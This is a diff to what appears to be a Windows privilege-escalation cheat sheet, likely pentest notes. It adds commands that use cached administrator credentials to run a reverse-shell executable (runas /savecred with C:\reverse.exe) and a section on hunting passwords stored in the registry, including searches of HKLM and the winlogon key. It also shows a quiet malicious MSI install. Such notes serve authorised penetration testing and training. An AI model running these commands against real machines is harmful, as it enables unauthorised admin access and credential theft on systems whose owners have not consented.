@@ -90,7 +90,9 @@ cmdkey /list
 
 If you find the cached credentials of an administrator create a reverse shell or download one, transfer it to the machine and execute it with the following command to get admin access:
 
-runas /savecred /user:WORKGROUP\User "Shell to execute"
+runas /savecred /user:User "Shell to execute"
+
+e.g: runas /savecred /user:admin C:\reverse.exe
 
 Make sure to set up a listener to catch the connection;).
 
@@ -132,6 +134,20 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 Create a reverse shell and upload it to the victim machine and use the following command to execute it:
 
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+### Password hunting
+
+You can query the registries that are containing the word password with the following command:
+
+reg query HKLM /f password /t REG_SZ /s
+
+You can check each registry with the reg query command for more information.
+
+e.g: reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+Pretty time consuming doing it manually, but if nothing works give it a go, otherwise use automated tools for this task.
+
+
 
 
 
